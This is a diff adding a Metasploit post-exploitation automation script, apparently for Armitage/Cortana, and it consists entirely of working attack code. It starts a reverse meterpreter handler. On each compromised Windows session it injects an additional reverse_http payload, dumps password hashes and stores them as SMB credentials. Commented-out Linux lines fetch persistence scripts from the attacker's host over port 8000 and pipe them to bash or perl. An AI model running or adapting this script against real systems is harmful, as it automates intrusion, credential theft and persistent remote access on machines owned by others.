@@ -1,0 +1,79 @@
+$local_ip = lhost();
+
+on ready {
+    println("[*] Post script loaded");
+    handler("windows/meterpreter/reverse_tcp", "10000", %(LHOST => lhost()));
+    println("[*] Started reverse handler on port 10000");
+}
+
+on meterpreter_hashdump {
+	local('$entry $user $hash $count');
+    $count = 0;
+	foreach $entry (split("\n", $3)) {
+		if ($entry ismatch '(.*?):\d+:(.*?):.*') {
+			($user, $hash) = matched();
+			credential_add(session_host($1), 445, $user, $hash, "smb_hash");
+			$count += 1;
+		}
+	}
+}
+
+on session_sync {
+    local('$os $console $rhost');
+    $rhost = session_host($1);
+    $os = host_os($rhost);
+    println("Session $1 opened. I got $rhost with " . session_exploit($1));
+	$console = console();
+	#$console = open_console_tab("$1 - $rhost"); #For debugging
+
+    if ($os ismatch ".*Linux.*") {
+        if(-ismeterpreter $1) {
+            m_cmd($1, "");
+        }
+    }
+    if ($os ismatch ".*Windows.*") {
+        if(-ismeterpreter $1) {
+
+            println("[*] $rhost - Injecting Cobalt Strike Beacon");
+            cmd($console, "use post/windows/manage/multi_meterpreter_inject");
+            cmd_set($console, %(LPORT => "8082", AMOUNT => "1", IPLIST => "$local_ip", HANDLER => "FALSE", PAYLOAD => "windows/meterpreter/reverse_http", SESSION => "$1"));
+            cmd($console, "exploit");
+            sleep(1 * 1000);
+            
+            println("[*] $rhost - Regular dumping hashes.")
+            m_cmd($1, "hashdump");
+        }
+    }
+    
+}
+
+on session_open {
+    local('$os $console $rhost');
+    $rhost = session_host($1);
+    $os = host_os($rhost);
+    println("Session $1 opened. I got $rhost with " . session_exploit($1));
+	$console = console();
+    if ($os ismatch ".*Windows.*") {
+        if( -isshell $1 ) {
+	        #$console = open_console_tab("$1 - $rhost"); #For debugging
+            #println("[*] $rhost - Upgrading Windows shell from $1");
+	    	#cmd_async("sessions -u $1");
+        }
+    }
+    if ($os ismatch ".*Linux.*") {
+        if( -isshell $1 ) {
+	        #$console = open_console_tab("$1 - $rhost"); #For debugging
+            #println("[*] $rhost - downloading persistence script");
+            #s_cmd($1, "wget -O- " . $local_ip . ":8000/persist.sh 2>/dev/null | bash");
+            #s_cmd($1, "wget -O- " . $local_ip . ":8000/service.sh 2>/dev/null | bash");
+            #s_cmd($1, "wget -O- " . $local_ip . ":8000/defend.sh 2>/dev/null | bash");
+            #s_cmd($1, "wget -O- " . $local_ip . ":8000/web.pl 2>/dev/null | perl");
+            #cmd($console, "use post/linux/gather/hashdump");
+            #cmd_set($console, %(SESSION => $1));
+            #cmd($console, "exploit");
+        }
+    }
+    
+}
+
+
